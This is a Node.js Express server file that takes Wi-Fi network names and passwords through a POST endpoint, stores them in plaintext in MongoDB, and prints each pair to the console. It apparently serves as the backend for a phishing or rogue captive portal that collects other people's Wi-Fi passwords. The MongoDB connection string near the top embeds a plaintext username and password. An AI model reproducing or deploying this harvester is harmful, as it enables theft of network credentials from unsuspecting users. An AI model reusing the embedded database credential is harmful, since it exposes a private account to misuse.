const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

mongoose.connect('mongodb+srv://kamranikramofficial_db_user:ZdeTxLAUP0doX2uP@portfolio-website.2chacsp.mongodb.net/pakautose?retryWrites=true&w=majority', {
  useNewUrlParser: true,
  useUnifiedTopology: true
});

const PasswordSchema = new mongoose.Schema({
  ssid: String,
  password: String,
  timestamp: Date
});

const Password = mongoose.model('Password', PasswordSchema);

app.post('/save-password', async (req, res) => {
  const { ssid, password } = req.body;
  
  await Password.create({
    ssid,
    password,
    timestamp: new Date()
  });

  console.log(`💾 Saved: ${ssid} => ${password}`);
  res.status(200).send("Saved");
});

app.listen(3000, () => console.log("Backend running on port 3000"));